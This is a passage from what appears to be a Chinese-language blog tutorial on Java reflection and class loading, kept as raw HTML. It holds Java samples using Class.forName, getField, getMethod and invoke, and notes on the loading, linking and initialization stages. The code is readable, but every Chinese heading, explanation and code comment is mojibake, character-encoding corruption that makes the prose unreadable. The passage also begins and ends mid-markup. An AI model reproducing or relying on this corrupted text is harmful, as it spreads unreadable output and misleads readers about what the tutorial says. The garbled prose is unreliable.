class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException </span>&#123;<br>        <span class="hljs-comment">// æ ¹æ®é…ç½®æ–‡ä»¶ re.properties æŒ‡å®šä¿¡æ¯ï¼Œåˆ›å»ºCatå¯¹è±¡å¹¶è°ƒç”¨æ–¹æ³•hi</span><br><br>        Properties properties = <span class="hljs-keyword">new</span> Properties();<br>        properties.load(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;src\\re.properties&quot;</span>));<br>        String classfulpath = properties.get(<span class="hljs-string">&quot;classfulpath&quot;</span>).toString();<br>        String methodName = properties.getProperty(<span class="hljs-string">&quot;method&quot;</span>).toString();<br><br>        <span class="hljs-comment">// ä½¿ç”¨åå°„æ¥è·å–ç±»å¹¶è°ƒç”¨å…¶ä¸­æ–¹æ³•</span><br>        <span class="hljs-comment">// 1.åŠ è½½ç±»    è¿”å›Classç±»å‹çš„å¯¹è±¡</span><br>        Class aClass = Class.forName(classfulpath);<br>        <span class="hljs-comment">// 2.é€šè¿‡aClass å¾—åˆ°åŠ è½½ç±»çš„ com.mechoy.Cat çš„å¯¹è±¡å®ä¾‹</span><br>        Object o = aClass.newInstance();<br>        System.out.println(o.getClass());       <span class="hljs-comment">// è·å–è¿è¡Œç±»å‹</span><br>        <span class="hljs-comment">// 3.é€šè¿‡ aClass å¾—åˆ°ä½ åŠ è½½çš„ç±»çš„ com.mechoy.Cat çš„ methodName çš„æ–¹æ³•å¯¹è±¡</span><br>        <span class="hljs-comment">//      å³ï¼šåœ¨åå°„ä¸­ï¼Œå¯ä»¥æŠŠæ–¹æ³•æ˜¯ä¸ºå¯¹è±¡</span><br>        Method method = aClass.getMethod(methodName,String.class);<br>        <span class="hljs-comment">// 4.é€šè¿‡æ–¹æ³•å¯¹è±¡ method è°ƒç”¨ com.mechoy.Cat ç±»ä¸­çš„ methodName æ–¹æ³•</span><br>        <span class="hljs-comment">//  å³ï¼šé€šè¿‡æ–¹æ³•å¯¹è±¡æ¥å®ç°è°ƒç”¨æ–¹æ³•</span><br>        <span class="hljs-comment">// ä¼ ç»Ÿæ–¹æ³• : å¯¹è±¡.æ–¹æ³•()</span><br>        <span class="hljs-comment">//  åå°„æœºåˆ¶: æ–¹æ³•.invoke(å¯¹è±¡)</span><br>        Object invoke = method.invoke(o, <span class="hljs-string">&quot;xxx&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åå°„æœºåˆ¶ğŸš©"><a href="#åå°„æœºåˆ¶ğŸš©" class="headerlink" title="åå°„æœºåˆ¶ğŸš©"></a>åå°„æœºåˆ¶ğŸš©</h3><ol><li>åå°„æœºåˆ¶å…è®¸ç¨‹åºåœ¨æ‰§è¡ŒæœŸé—´å€ŸåŠ©äºReflection APIå–å¾—ä»»ä½•ç±»çš„å†…éƒ¨ä¿¡æ¯(æ¯”å¦‚æˆå‘˜å˜é‡ã€æ„é€ å™¨ã€æˆå‘˜æ–¹æ³•ç­‰)ï¼Œå¹¶èƒ½æ“ä½œå¯¹è±¡çš„å±æ€§åŠæ–¹æ³•ã€‚åå°„åœ¨è®¾è®¡æ¨¡å¼å’Œæ¡†æ¶åº•å±‚éƒ½ä¼šç”¨åˆ°</li><li>åŠ è½½å®Œç±»ä¹‹åï¼Œåœ¨å †ä¸­å°±äº§ç”Ÿäº†ä¸€ä¸ªClassç±»å‹çš„å¯¹è±¡ï¼ˆä¸€ä¸ªç±»åªæœ‰ä¸€ä¸ªClasså¯¹è±¡ï¼‰ï¼Œè¿™ä¸ªå¯¹è±¡åŒ…å«äº†ç±»çš„å®Œæ•´ç»“æ„ä¿¡æ¯ã€‚é€šè¿‡è¿™ä¸ªå¯¹è±¡å¾—åˆ°ç±»çš„ç»“æ„ã€‚è¯¥å¯¹è±¡å°±åƒä¸€é¢é•œå­ï¼Œé€è¿‡è¿™ä¸ªé•œå­çœ‹åˆ°ç±»çš„ç»“æ„ï¼Œæ‰€ä»¥ï¼Œå½¢è±¡çš„ç§°ä¹‹ä¸ºï¼š<strong>åå°„</strong></li></ol><h4 id="Javaåå°„æœºåˆ¶åŸç†ç¤ºæ„å›¾"><a href="#Javaåå°„æœºåˆ¶åŸç†ç¤ºæ„å›¾" class="headerlink" title="Javaåå°„æœºåˆ¶åŸç†ç¤ºæ„å›¾"></a>Javaåå°„æœºåˆ¶åŸç†ç¤ºæ„å›¾</h4><p><img src="/2022/08/27/Java%E5%8F%8D%E5%B0%84/Java%E5%8F%8D%E5%B0%8401.png"></p><h4 id="åå°„æœºåˆ¶çš„ä½œç”¨"><a href="#åå°„æœºåˆ¶çš„ä½œç”¨" class="headerlink" title="åå°„æœºåˆ¶çš„ä½œç”¨"></a>åå°„æœºåˆ¶çš„ä½œç”¨</h4><ol><li>åœ¨è¿è¡Œæ—¶åˆ¤æ–­ä»»æ„ä¸€ä¸ªå¯¹è±¡æ‰€å±çš„ç±»</li><li>åœ¨è¿è¡Œæ—¶æ„é€ ä»»æ„ä¸€ä¸ªç±»çš„å¯¹è±¡</li><li>åœ¨è¿è¡Œæ—¶å¾—åˆ°ä»»æ„ä¸€ä¸ªç±»æ‰€å…·æœ‰çš„æˆå‘˜å˜é‡å’Œæ–¹æ³•</li><li>åœ¨è¿è¡Œæ—¶è°ƒç”¨ä»»æ„ä¸€ä¸ªå¯¹è±¡çš„æˆå‘˜å˜é‡å’Œæ–¹æ³•</li><li>ç”ŸæˆåŠ¨æ€ä»£ç†</li></ol><h4 id="åå°„æœºåˆ¶çš„ä¼˜ç¼ºç‚¹"><a href="#åå°„æœºåˆ¶çš„ä¼˜ç¼ºç‚¹" class="headerlink" title="åå°„æœºåˆ¶çš„ä¼˜ç¼ºç‚¹"></a>åå°„æœºåˆ¶çš„ä¼˜ç¼ºç‚¹</h4><p>ä¼˜ç‚¹ï¼šå¯ä»¥åŠ¨æ€çš„åˆ›å»ºå’Œä½¿ç”¨å¯¹è±¡ï¼ˆå„ç±»æ¡†æ¶åº•å±‚æ ¸å¿ƒï¼‰ï¼Œä½¿ç”¨çµæ´»ï¼Œæ²¡æœ‰åå°„æœºåˆ¶ï¼Œæ¡†æ¶æŠ€æœ¯å°±å¤±å»åº•å±‚æ”¯æŒ</p><p>ç¼ºç‚¹ï¼šä½¿ç”¨åå°„åŸºæœ¬æ˜¯è§£é‡Šæ‰§è¡Œï¼Œå¯¹æ‰§è¡Œé€Ÿåº¦æœ‰å½±å“</p><h3 id="Classç±»ğŸš©"><a href="#Classç±»ğŸš©" class="headerlink" title="Classç±»ğŸš©"></a>Classç±»ğŸš©</h3><p><img src="/2022/08/27/Java%E5%8F%8D%E5%B0%84/Java%E5%8F%8D%E5%B0%8402.png"></p><ol><li>Classä¹Ÿæ˜¯ç±»ï¼Œå› æ­¤ä¹Ÿç»§æ‰¿Objectç±»</li><li>Classç±»å¯¹è±¡ä¸æ˜¯newå‡ºæ¥çš„ï¼Œè€Œæ˜¯ç³»ç»Ÿåˆ›å»ºçš„</li><li>å¯¹äºæŸä¸ªç±»çš„Classç±»å¯¹è±¡ï¼Œåœ¨å†…å­˜ä¸­åªæœ‰ä¸€ä»½ï¼Œå› ä¸ºç±»åªåŠ è½½ä¸€æ¬¡</li><li>æ¯ä¸€ä¸ªç±»çš„å®ä¾‹éƒ½ä¼šè®°å¾—è‡ªå·±æ˜¯ç”±å“ªä¸ªClasså®ä¾‹æ‰€ç”Ÿæˆ</li><li>é€šè¿‡Classå¯ä»¥å®Œæ•´åœ°å¾—åˆ°ä¸€ä¸ªç±»çš„å®Œæ•´ç»“æ„ï¼Œé€šè¿‡Classç±»çš„æ–¹æ³•</li><li>Classå¯¹è±¡æ˜¯å­˜åœ¨åœ¨å †çš„</li><li>ç±»çš„å­—èŠ‚ç äºŒè¿›åˆ¶æ•°æ®ï¼Œæ˜¯æ”¾åœ¨æ–¹æ³•åŒºçš„ï¼Œæœ‰ç‚¹åœ°æ–¹ç§°ä¸ºç±»çš„å…ƒæ•°æ®ï¼ˆåŒ…æ‹¬æ–¹æ³•ä»£ç ã€å˜é‡åã€æ–¹æ³•åã€è®¿é—®æƒé™ç­‰ç­‰ï¼‰</li></ol><h4 id="Classç±»çš„å¸¸ç”¨æ–¹æ³•"><a href="#Classç±»çš„å¸¸ç”¨æ–¹æ³•" class="headerlink" title="Classç±»çš„å¸¸ç”¨æ–¹æ³•"></a>Classç±»çš„å¸¸ç”¨æ–¹æ³•</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// ç¤ºä¾‹ç±»</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Car</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> String brand=<span class="hljs-string">&quot;BMW&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> price=<span class="hljs-number">500000</span>;<br>    <span class="hljs-keyword">public</span> String color=<span class="hljs-string">&quot;black&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Class02</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchFieldException </span>&#123;<br>        String classAllPath = <span class="hljs-string">&quot;com.mechoy.Car&quot;</span>;<br>        <span class="hljs-comment">// 1.è·å–å¯¹åº”ç±»çš„ Classå¯¹è±¡</span><br>        <span class="hljs-comment">// &lt;?&gt;  è¡¨ç¤ºä¸ç¡®å®šçš„Javaç±»å‹ï¼Œå¯ä¸å†™</span><br>        Class&lt;?&gt; aClass = Class.forName(classAllPath);<br>        <span class="hljs-comment">// 2.è¾“å‡ºaClass</span><br>        System.out.println(aClass);     <span class="hljs-comment">// æ˜¾ç¤ºæ˜¯å“ªä¸ªç±»çš„Classå¯¹è±¡</span><br>        System.out.println(aClass.getClass());  <span class="hljs-comment">// è¾“å‡ºè¿è¡Œç±»å‹</span><br>        <span class="hljs-comment">// 3.å¾—åˆ°åŒ…å.Classå¯¹è±¡å¯¹åº”çš„é‚£ä¸ªç±»æ‰€åœ¨çš„åŒ…</span><br>        System.out.println(aClass.getPackage());<br>        <span class="hljs-comment">// 4.å¾—åˆ°ç±»å,Classå¯¹è±¡å¯¹åº”çš„é‚£ä¸ªç±»çš„å…¨ç±»å</span><br>        System.out.println(aClass.getName());<br>        <span class="hljs-comment">// 5.ç”ŸæˆClasså¯¹è±¡å¯¹åº”çš„é‚£ä¸ªç±»çš„å¯¹è±¡å®ä¾‹,ä¾‹å¦‚æ­¤å¤„å¼ºè½¬æˆCar</span><br>        Car car = (Car)aClass.newInstance();<br>        System.out.println(car);<br>        <span class="hljs-comment">// 6.é€šè¿‡åå°„è·å–å±æ€§[FieId] ä¾‹å¦‚æ­¤å¤„brand,è·å–publicä¿®é¥°çš„å±æ€§</span><br>        Field brand = aClass.getField(<span class="hljs-string">&quot;brand&quot;</span>);<br>        System.out.println(brand.get(car));<br>        <span class="hljs-comment">// 7.è®¾ç½®å±æ€§å€¼</span><br>        brand.set(car,<span class="hljs-string">&quot;Audi&quot;</span>);<br>        System.out.println(car);<br>        <span class="hljs-comment">// 8.å¾—åˆ°æ‰€æœ‰çš„å±æ€§,éå†ï¼Œå¾—åˆ°æ‰€æœ‰çš„å±æ€§å€¼</span><br>        Field[] fields = aClass.getFields();<br>        <span class="hljs-keyword">for</span> (Field field: fields) &#123;<br>            System.out.println(field.get(car));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="è·å–Classç±»å¯¹è±¡çš„æ–¹å¼"><a href="#è·å–Classç±»å¯¹è±¡çš„æ–¹å¼" class="headerlink" title="è·å–Classç±»å¯¹è±¡çš„æ–¹å¼"></a>è·å–Classç±»å¯¹è±¡çš„æ–¹å¼</h4><ol><li><p>æ–¹å¼ä¸€</p><ul><li>å‰æï¼šå·²çŸ¥ä¸€ä¸ªç±»çš„å…¨ç±»åï¼Œä¸”è¯¥ç±»åœ¨ç±»è·¯å¾„ä¸‹ï¼Œå¯ä»¥é€šè¿‡Classç±»çš„é™æ€æ–¹æ³•<code>forName()</code>è·å–ï¼Œå¯èƒ½æŠ›å‡ºClassNotFoundException</li></ul></li></ol><ul><li>å®ä¾‹ï¼š<code>Class cls1 = Class.forName(&quot;java.lang.Cat&quot;)</code><ul><li>åº”ç”¨åœºæ™¯ï¼šå¤šç”¨äºé…ç½®æ–‡ä»¶ï¼Œè¯»å–ç±»å…¨è·¯å¾„ï¼ŒåŠ è½½ç±»</li><li><strong>æ³¨æ„ï¼š</strong><code>Class.forName(&quot;fulClassName&quot;)</code>å°†ç±»è¿›è¡Œåˆå§‹åŒ–ï¼ŒåŠ è½½ç±»ï¼Œä¸ä¼šåˆ›å»ºç±»çš„å®ä¾‹å¯¹è±¡ï¼Œå¾—åˆ°çš„æ˜¯ä¸€ä¸ªClassçš„å®ä¾‹å¯¹è±¡</li></ul></li></ul><ol start="2"><li><p>æ–¹å¼2</p><ul><li><p>å‰æï¼šè‹¥å·²çŸ¥å…·ä½“çš„ç±»ï¼Œé€šè¿‡ç±»çš„classè·å–ï¼Œè¯¥æ–¹å¼æœ€ä¸ºå®‰å…¨å¯é ï¼Œç¨‹åºæ€§èƒ½æœ€é«˜</p></li><li><p>å®ä¾‹ï¼šClass cls2 = Cat.class</p></li><li><p>åº”ç”¨åœºæ™¯ï¼šå¤šç”¨äºå‚æ•°ä¼ é€’ï¼Œæ¯”å¦‚é€šè¿‡åå°„å¾—åˆ°å¯¹åº”æ„é€ å™¨å¯¹è±¡ </p></li><li><p><strong>æ³¨æ„ï¼š</strong>åœ¨ä½¿ç”¨è¯¥æ–¹å¼è·å–Classç±»å¯¹è±¡æ—¶ï¼Œå¹¶ä¸ä¼šåˆå§‹åŒ–è¯¥å¯¹è±¡ï¼ˆå¯ä»¥ç†è§£æˆä¸ºä¸ä¼šåŠ è½½é™æ€å˜é‡å’Œé™æ€ä»£ç å—ï¼‰</p><p><img src="/2022/08/27/Java%E5%8F%8D%E5%B0%84/Java%E5%8F%8D%E5%B0%8405.png"></p></li></ul></li><li><p>æ–¹å¼3</p><ul><li>å‰æï¼šå·²çŸ¥æŸä¸ªç±»çš„å®ä¾‹ï¼Œè°ƒç”¨è¯¥å®ä¾‹çš„getClass()æ–¹æ³•è·å–Classå¯¹è±¡</li><li>å®ä¾‹ï¼š<code>Class clazz = å¯¹è±¡.getClass</code>   // è·å–è¿è¡Œç±»å‹</li><li>åº”ç”¨åœºæ™¯ï¼šé€šè¿‡åˆ›å»ºå¥½çš„å¯¹è±¡ï¼Œè·å–Classå¯¹è±¡</li></ul></li><li><p>æ–¹å¼4</p><ul><li><p>é€šè¿‡ç±»åŠ è½½å™¨</p></li><li><p>å®ä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// (1) å…ˆå¾—åˆ°ç±»åŠ è½½å™¨</span><br>ClassLoader classLoader = car.getClass().getClassLoader();<br><span class="hljs-comment">// (2) é€šè¿‡ç±»åŠ è½½å™¨å¾—åˆ°Classå¯¹è±¡</span><br>Class&lt;?&gt; cls4 = classLoader.loadClass(<span class="hljs-string">&quot;com.mechoy.Car&quot;</span>);<br></code></pre></td></tr></table></figure></li><li><p>åº”ç”¨åœºæ™¯ï¼šæ— </p></li></ul></li><li><p>åŸºæœ¬æ•°æ®ç±»å‹(int,char,boolean,float,double,byte,long,short)æŒ‰å¦‚ä¸‹æ–¹å¼å¾—åˆ°Classå¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Class cls = åŸºæœ¬æ•°æ®ç±»å‹.class<br><span class="hljs-comment">// Class&lt;Integer&gt; integerClass = int.class;</span><br></code></pre></td></tr></table></figure></li><li><p>åŸºæœ¬æ•°æ®ç±»å‹å¯¹åº”çš„åŒ…è£…ç±»ï¼Œå¯ä»¥é€šè¿‡.typeå¾—åˆ°Classç±»å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Class cls = åŒ…è£…ç±».TYPE<br><span class="hljs-comment">// ç¤ºä¾‹ï¼š</span><br>Class&lt;Integer&gt; type = Integer.TYPE;<br>System.out.println(type);   <span class="hljs-comment">// å¾—åˆ°åŸºæœ¬æ•°æ®ç±»å‹</span><br></code></pre></td></tr></table></figure></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetClass</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException </span>&#123;<br>        <span class="hljs-comment">// æ–¹å¼1 Class.forName</span><br>        String classFulPath = <span class="hljs-string">&quot;com.mechoy.Car&quot;</span>;<br>        Class&lt;?&gt; cls1 = Class.forName(classFulPath);<br>        System.out.println(cls1.getName());<br><br>        <span class="hljs-comment">// æ–¹å¼2 ç±»å.class,å¤šç”¨äºå‚æ•°ä¼ é€’</span><br>        Class&lt;Car&gt; cls2 = Car.class;<br>        System.out.println(cls2);<br><br>        <span class="hljs-comment">// æ–¹å¼3</span><br>        Car car = <span class="hljs-keyword">new</span> Car();<br>        Class&lt;? extends Car&gt; cls3 = car.getClass();<br>        System.out.println(cls3);<br><br>        <span class="hljs-comment">// æ–¹å¼4 é€šè¿‡ç±»åŠ è½½å™¨è·å–åˆ°ç±»çš„Classå¯¹è±¡ã€4ç§ç±»åŠ è½½å™¨ã€‘</span><br>        <span class="hljs-comment">// (1) å…ˆå¾—åˆ°ç±»åŠ è½½å™¨</span><br>        ClassLoader classLoader = car.getClass().getClassLoader();<br>        <span class="hljs-comment">// (2) é€šè¿‡ç±»åŠ è½½å™¨å¾—åˆ°Classå¯¹è±¡</span><br>        Class&lt;?&gt; cls4 = classLoader.loadClass(<span class="hljs-string">&quot;com.mechoy.Car&quot;</span>);<br>        System.out.println(cls4);<br><br>        <span class="hljs-comment">// cls1\cls2\cls3\cls4 æ˜¯åŒä¸€ä¸ªClasså¯¹è±¡</span><br>        System.out.println(cls1.hashCode());<br>        System.out.println(cls2.hashCode());<br>        System.out.println(cls3.hashCode());<br>        System.out.println(cls4.hashCode());<br><br>        <span class="hljs-comment">// æ–¹å¼5 åŸºæœ¬æ•°æ®ç±»å‹(int,char,boolean,float,double,byte,long,short)</span><br>        Class&lt;Integer&gt; integerClass = <span class="hljs-keyword">int</span>.class;<br>        System.out.println(integerClass);<br><br>        <span class="hljs-comment">// æ–¹å¼6 åŸºæœ¬æ•°æ®ç±»å‹å¯¹åº”çš„åŒ…è£…ç±»</span><br>        Class&lt;Integer&gt; type = Integer.TYPE;<br>        System.out.println(type);   <span class="hljs-comment">// å¾—åˆ°åŸºæœ¬æ•°æ®ç±»å‹</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="æœ‰Classç±»å¯¹è±¡çš„ç±»å‹"><a href="#æœ‰Classç±»å¯¹è±¡çš„ç±»å‹" class="headerlink" title="æœ‰Classç±»å¯¹è±¡çš„ç±»å‹"></a>æœ‰Classç±»å¯¹è±¡çš„ç±»å‹</h4><ol><li>å¤–éƒ¨ç±»ï¼Œæˆå‘˜å†…éƒ¨ç±»ï¼Œé™æ€å†…éƒ¨ç±»ï¼Œå±€éƒ¨å†…éƒ¨ç±»ï¼ŒåŒ¿åå†…éƒ¨ç±»</li><li>interfaceï¼šæ¥å£</li><li>æ•°ç»„</li><li>enumï¼šæšä¸¾</li><li>annotationï¼šæ³¨è§£</li><li>åŸºæœ¬æ•°æ®ç±»å‹</li><li>void</li></ol><h3 id="ç±»åŠ è½½ğŸš©"><a href="#ç±»åŠ è½½ğŸš©" class="headerlink" title="ç±»åŠ è½½ğŸš©"></a>ç±»åŠ è½½ğŸš©</h3><p>åå°„æœºåˆ¶æ˜¯javaå®ç°åŠ¨æ€è¯­è¨€çš„å…³é”®ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡åå°„å®ç°ç±»åŠ¨æ€åŠ è½½</p><ol><li>é™æ€åŠ è½½ï¼šç¼–è¯‘æ—¶åŠ è½½ç›¸å…³çš„ç±»ï¼Œå¦‚æœæ²¡æœ‰åˆ™æŠ¥é”™ï¼Œä¾èµ–æ€§å¤ªå¼º</li><li>åŠ¨æ€åŠ è½½ï¼šè¿è¡Œæ—¶åŠ è½½éœ€è¦çš„ç±»ï¼Œå¦‚æœè¿è¡Œæ—¶ä¸ç”¨è¯¥ç±»ï¼Œåˆ™ä¸æŠ¥é”™ï¼Œé™ä½äº†ä¾èµ–æ€§</li></ol><h4 id="ç±»åŠ è½½æ—¶æœº"><a href="#ç±»åŠ è½½æ—¶æœº" class="headerlink" title="ç±»åŠ è½½æ—¶æœº"></a>ç±»åŠ è½½æ—¶æœº</h4><ol><li>å½“åˆ›å»º(new)å¯¹è±¡æ—¶                            // é™æ€åŠ è½½</li><li>å½“å­ç±»è¢«åŠ è½½æ—¶ï¼Œçˆ¶ç±»ä¹Ÿè¦è¢«åŠ è½½   // é™æ€åŠ è½½</li><li>è°ƒç”¨ç±»ä¸­çš„é™æ€æˆå‘˜æ—¶                      // é™æ€åŠ è½½</li><li>é€šè¿‡åå°„                                             // åŠ¨æ€åŠ è½½</li></ol><h4 id="ç±»åŠ è½½è¿‡ç¨‹å›¾"><a href="#ç±»åŠ è½½è¿‡ç¨‹å›¾" class="headerlink" title="ç±»åŠ è½½è¿‡ç¨‹å›¾"></a>ç±»åŠ è½½è¿‡ç¨‹å›¾</h4><p>ç±»åŠ è½½ä¸»è¦æ˜¯åˆ†3ä¸ªé˜¶æ®µ</p><ol><li>åŠ è½½[Loading]</li><li>è¿æ¥[Linking]<ol><li>éªŒè¯[verification]</li><li>å‡†å¤‡[Preparation]</li><li>è§£æ[Resolution]</li></ol></li><li>åˆå§‹åŒ–[Initialization]</li></ol><p><img src="/2022/08/27/Java%E5%8F%8D%E5%B0%84/Java%E5%8F%8D%E5%B0%8403.png"></p><p><img src="/2022/08/27/Java%E5%8F%8D%E5%B0%84/Java%E5%8F%8D%E5%B0%8404.png"></p><h5 id="åŠ è½½é˜¶æ®µ"><a href="#åŠ è½½é˜¶æ®µ" class="headerlink" title="åŠ è½½é˜¶æ®µ"></a>åŠ è½½é˜¶æ®µ</h5><p>JVMåœ¨è¯¥é˜¶æ®µçš„ä¸»è¦ç›®çš„æ˜¯å°†å­—èŠ‚ç ä»ä¸åŒçš„æ•°æ®æºï¼ˆå¯èƒ½æ˜¯classæ–‡ä»¶ã€ä¹Ÿå¯èƒ½æ˜¯jaråŒ…ã€ç”šè‡³ç½‘ç»œï¼‰è½¬åŒ–ä¸º<strong>äºŒè¿›åˆ¶å­—èŠ‚æµåŠ è½½åˆ°å†…å­˜ä¸­</strong>ï¼Œå¹¶åŒæ—¶ç”Ÿæˆä¸€ä¸ªä»£è¡¨è¯¥ç±»çš„java.lang.Classå¯¹è±¡</p><h5 id="è¿æ¥é˜¶æ®µ-éªŒè¯"><a href="#è¿æ¥é˜¶æ®µ-éªŒè¯" class="headerlink" title="è¿æ¥é˜¶æ®µ-éªŒè¯"></a>è¿æ¥é˜¶æ®µ-éªŒè¯</h5><ol><li>ç¡®ä¿Classæ–‡ä»¶çš„å­—èŠ‚æµä¸­åŒ…å«çš„ä¿¡æ¯ç¬¦åˆå½“å‰è™šæ‹Ÿæœºçš„è¦æ±‚ï¼Œå¹¶ä¸”ä¸ä¼šå±å®³è™šæ‹Ÿæœºè‡ªèº«å®‰å…¨</li><li>åŒ…æ‹¬ï¼šæ–‡ä»¶æ ¼å¼éªŒè¯ï¼ˆæ˜¯å¦ä»¥é­”æ•°oxcafebabeå¼€å¤´ï¼‰ã€å…ƒæ•°æ®éªŒè¯ã€å­—èŠ‚ç éªŒè¯å’Œç¬¦åˆå¼•ç”¨éªŒè¯</li><li>å¯ä»¥è€ƒè™‘ä½¿ç”¨ -Xverify:none å‚æ•°æ¥å…³é—­å¤§éƒ¨åˆ†çš„ç±»éªŒè¯æªæ–½ï¼Œç¼©çŸ­è™šæ‹Ÿæœºç±»åŠ è½½çš„æ—¶é—´</li></ol><h5 id="è¿æ¥é˜¶æ®µ-å‡†å¤‡"><a href="#è¿æ¥é˜¶æ®µ-å‡†å¤‡" class="headerlink" title="è¿æ¥é˜¶æ®µ-å‡†å¤‡"></a>è¿æ¥é˜¶æ®µ-å‡†å¤‡</h5><p>JVMä¼šåœ¨è¯¥é˜¶æ®µå¯¹<strong>é™æ€å˜é‡</strong>ï¼Œåˆ†é…å†…å­˜å¹¶é»˜è®¤åˆå§‹åŒ–ï¼ˆå¯¹åº”æ•°æ®ç±»å‹çš„é»˜è®¤åˆå§‹åŒ–ï¼Œå¦‚0ã€0Lã€nullã€falseç­‰ï¼‰ã€‚è¿™äº›<strong>å˜é‡æ‰€ä½¿ç”¨çš„çš„å†…å­˜éƒ½å°†åœ¨æ–¹æ³•åŒºä¸­è¿›è¡Œåˆ†é…</strong>ã€‚</p><h5 id="è¿æ¥é˜¶æ®µ-è§£æ"><a href="#è¿æ¥é˜¶æ®µ-è§£æ" class="headerlink" title="è¿æ¥é˜¶æ®µ-è§£æ"></a>è¿æ¥é˜¶æ®µ-è§£æ</h5><p>è™šæ‹Ÿæœºå°†å¸¸é‡æ± å†…çš„ç¬¦å·å¼•ç”¨æ›¿æ¢ä¸ºç›´æ¥å¼•ç”¨çš„è¿‡ç¨‹</p><h5 id="åˆå§‹åŒ–"><a href="#åˆå§‹åŒ–" class="headerlink" title="åˆå§‹åŒ–"></a>åˆå§‹åŒ–</h5><ol><li>åˆ°åˆå§‹åŒ–é˜¶æ®µï¼Œæ‰çœŸæ­£å¼€å§‹æ‰§è¡Œç±»ä¸­å®šä¹‰çš„Javaç¨‹åºä»£ç ï¼Œæ­¤é˜¶æ®µæ˜¯æ‰§è¡Œ&lt;clinit&gt;()æ–¹æ³•çš„è¿‡ç¨‹</li><li>&lt;clinit&gt;() æ–¹æ³•æ˜¯ç”±ç¼–è¯‘å™¨æŒ‰è¯­å¥åœ¨æºæ–‡ä»¶ä¸­å‡ºç°çš„é¡ºåºï¼Œä¸€æ¬¡è‡ªåŠ¨æ”¶é›†ç±»ä¸­çš„æ‰€æœ‰<strong>é™æ€å˜é‡</strong>çš„èµ‹å€¼åŠ¨ä½œå’Œ<strong>é™æ€ä»£ç å—</strong>ä¸­çš„è¯­å¥ï¼Œå¹¶è¿›è¡Œåˆå¹¶ã€‚</li><li>è™šæ‹Ÿæœºä¼šä¿è¯ä¸€ä¸ªç±»çš„&lt;clinit&gt;()æ–¹æ³•åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­è¢«æ­£ç¡®çš„åŠ 